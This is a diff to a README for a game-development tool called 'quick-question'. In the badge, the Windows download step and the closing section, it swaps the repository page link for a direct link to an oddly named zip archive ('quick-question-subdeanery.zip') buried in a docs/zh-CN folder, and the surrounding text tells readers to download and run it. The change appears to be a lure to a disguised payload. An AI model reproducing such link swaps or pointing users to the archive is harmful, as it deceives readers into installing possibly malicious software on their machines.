@@ -1,6 +1,6 @@
 # 🎮 quick-question - Faster Game Dev Review Loop
 
-[![Download quick-question](https://img.shields.io/badge/Download%20quick--question-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandonle7116/quick-question)
+[![Download quick-question](https://img.shields.io/badge/Download%20quick--question-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip)
 
 ## 🖥️ What this is
 
@@ -17,7 +17,7 @@ It works with common game tools like Unity, Godot, Unreal, and S&box. It uses `/
 
 Visit this page to download and run quick-question on Windows:
 
-https://github.com/brandonle7116/quick-question
+https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip
 
 After you open the page:
 
@@ -195,4 +195,4 @@ It is a good fit if you want a clear path from change to verification
 
 Download or open the main page here:
 
-https://github.com/brandonle7116/quick-question
+https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip
